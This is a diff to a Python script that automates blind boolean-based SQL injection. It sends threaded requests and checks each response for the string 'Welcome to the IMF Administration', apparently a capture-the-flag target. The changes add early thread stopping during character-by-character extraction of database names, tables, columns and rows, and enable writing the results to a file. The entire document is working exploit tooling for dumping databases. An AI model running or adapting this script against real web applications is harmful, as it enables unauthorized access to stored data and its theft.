@@ -72,6 +72,9 @@ post_data_exploit = ""
 get_data = "home"
 condition = "Welcome to the IMF Administration"
 num_threads = 10
+
+stop_threads = True
+character_finded = 0
 dbs = []
 
 
@@ -116,35 +119,48 @@ def build_data(info_name, position, db, table):
 
 
 def send_request(requests_data):
+    global stop_threads
+    global character_finded
+
+    if stop_threads:
+        return
 
     if method == "POST":
         response = requests.post(main_url, headers=headers, data=requests_data.data)
     else:
         response = requests.get(requests_data.data, headers=headers)
 
-    return WrapperResponse(response.text, requests_data.character)
+    if condition in response.text:
+        character_finded = requests_data.character
+        stop_threads = True
+
+    return chr(requests_data.character)
 
 
 def get_info(label_info, label_menu, info_name, db=None, table=None):
+    global stop_threads
 
+    stop_threads = True
     info = ""
     position = 1
-    find_characters = True
 
-    while find_characters:
-        find_characters = False
+    while stop_threads:
+        stop_threads = False
 
         requests_data = build_data(info_name, position, db, table)
 
         with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
-            responses = list(executor.map(send_request, requests_data))
+            futures = {executor.submit(send_request, data) for data in requests_data}
+            for future in concurrent.futures.as_completed(futures):
+                result = future.result()
+                label_menu.status(result)
+                if stop_threads:
+                    executor.shutdown(wait=False)
+                    break
 
-        for response in responses:
-            if condition in response.text:
-                info += chr(response.character)
-                label_info.status(f"{Color.GREEN}{info}{Color.END}")
-                find_characters = True
-                break
+        if stop_threads:
+            info += chr(character_finded)
+            label_info.status(f"{Color.GREEN}{info}{Color.END}")
 
         position += 1
 
@@ -434,7 +450,7 @@ def main():
     get_tables(label_menu)
     get_columns(label_menu)
     get_rows(label_menu)
-    # build_file()
+    build_file()
 
 
 # Main
